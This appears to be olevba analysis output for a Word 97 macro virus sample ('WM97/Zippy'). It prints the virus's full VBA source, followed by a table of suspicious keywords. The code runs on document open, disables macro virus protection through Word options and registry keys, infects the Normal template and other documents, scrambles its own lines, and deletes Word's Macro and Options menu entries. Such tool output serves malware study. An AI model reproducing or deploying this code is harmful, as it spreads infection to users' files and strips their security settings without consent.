olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.bd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.bd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo zippy
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): x = 0: o = 0
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

st = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
If st > 0 And rt > 0 Then GoTo zippy
If st = 0 Then
    Set rl = NormalTemplate.VBProject.VBComponents

    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) > 1 And Day(Now()) = 10 Then Application.ActiveDocument.PrintOut , , , "The Zippy Infection.vir"
    If Month(Now()) > 1 And Day(Now()) = 15 Then Application.ActiveDocument.PrintOut , , , "Virus says Hi.vir"
    If Month(Now()) > 1 And Day(Now()) = 20 Then Application.ActiveDocument.PrintOut , , , "Stop killing baby virii.vir"

    If Month(Now()) > 1 And Day(Now()) = 25 Then Application.ActiveDocument.PrintOut , , , "Zippy Zippy Zippy.vir"
    hst.Item(Abs(1)).Name = rl.Item(Abs(1)).Name
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version
End If

If rt = 0 Then Set rl = ActiveDocument.VBProject.VBComponents
rl.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version
With rl.Item(Abs(1)).codemodule
    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)
        Next j
    End With
  With rl.Item(Abs(1)).codemodule

 For j = Chr(53) To rl.Item(Abs(1)).codemodule.countoflines Step Chr(53)
    x = Int(Rnd(412835) * 303989) + 8485
    o = Int(Rnd(487958) * 785865) + 2988
    .replaceline j, Chr(39) & x * o & o * x & x * o

    Next j
 End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"

System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
If st = 0 Then CommandBars("tools").Controls("Macro").Delete
If st = 0 Then CommandBars("tools").Controls("Options...").Delete
If st = 0 Then rl.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"

If st = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
zippy:
If st <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/Zippy by Virus :) Smile
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

